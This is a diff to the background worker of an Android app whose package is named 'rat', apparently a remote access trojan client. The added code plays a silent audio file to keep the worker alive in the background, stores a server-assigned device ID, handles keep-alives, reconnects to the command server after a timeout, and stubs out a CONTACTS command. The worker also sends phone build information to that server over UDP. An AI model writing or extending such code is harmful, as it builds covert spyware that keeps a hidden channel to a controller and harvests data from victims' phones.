@@ -1,14 +1,17 @@
 package ru.awawa.rat.worker
 
 import android.content.Context
+import android.media.MediaPlayer
 import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
+import ru.awawa.rat.R
 import ru.awawa.rat.helper.BuildInfo
 import ru.awawa.rat.helper.Preferences
 import ru.awawa.rat.worker.helper.State
 import ru.awawa.rat.worker.helper.protocol.*
 import java.net.*
+import java.util.*
 
 
 class BackgroundWorker(context: Context, workerParams: WorkerParameters):
@@ -16,9 +19,10 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
 
     companion object {
         private const val TAG = "BackgroundWorker"
+        private const val CONNECTION_TIMEOUT = 60000L
     }
 
-    private var workerRunning = false
+    private var mediaPlayer = MediaPlayer.create(context, R.raw.silence)
 
     private val socket = DatagramSocket()
     private val state = State()
@@ -30,6 +34,8 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
         val buffer = ByteArray(2048)
         val rcvPacket = DatagramPacket(buffer, 2048)
 
+        mediaPlayer.start()
+
         while (state.running) {
             try {
                 socket.receive(rcvPacket)
@@ -38,6 +44,9 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
                 this.sleep()
             }
         }
+
+        mediaPlayer.stop()
+        mediaPlayer.release()
 
         return Result.success()
     }
@@ -54,6 +63,8 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
 
             MagicNumber.START -> {
                 val id = (packet as StartPacket).id
+                Preferences.set(Preferences.PreferencesField.ID, id)
+                Log.w(TAG, "Setting id to preferences: $id")
                 this.state.id = id
                 val pckt = PhoneInfoPacket(this.state.id, BuildInfo.getInfo())
                 this.state.setStateConnected()
@@ -66,7 +77,10 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
             }
 
             MagicNumber.KEEP_ALIVE -> {
-
+                val id = (packet as KeepAlivePacket).id
+                if (id == this.state.id) {
+                    this.state.onKeepAliveReceived()
+                }
             }
 
             MagicNumber.PHONE_INFO -> {
@@ -78,6 +92,10 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
                 val pckt = PhoneInfoPacket(id, BuildInfo.getInfo())
                 this.socket.send(DatagramPacket(pckt.data, pckt.data.size, datagramPacket.address, datagramPacket.port))
             }
+
+            MagicNumber.CONTACTS -> {
+
+            }
         }
     }
 
@@ -86,7 +104,9 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
         if (state.needToSendStartRequest()) {
             this.state.startSent()
             this.state.setStateWaiting()
-            val buffer = StartPacket(Preferences.get(Preferences.PreferencesField.ID) ?: "").data
+            val id = Preferences.get(Preferences.PreferencesField.ID) ?: ""
+            Log.w(TAG, "Getting id from preferences: $id")
+            val buffer = StartPacket(id).data
             val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)
 
             this.socket.send(packet)
@@ -98,9 +118,13 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
             val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)
 
             this.socket.send(packet)
+            Log.w(TAG, "Keep alive sent")
         }
 
-        Log.w(TAG, "Nothing received...")
+        if (Date().time - state.lastServerCheckIn > CONNECTION_TIMEOUT) {
+            this.state.connect(this.state.serverAddress!!, this.state.serverPort)
+        }
+
         Thread.sleep(500)
     }
 }
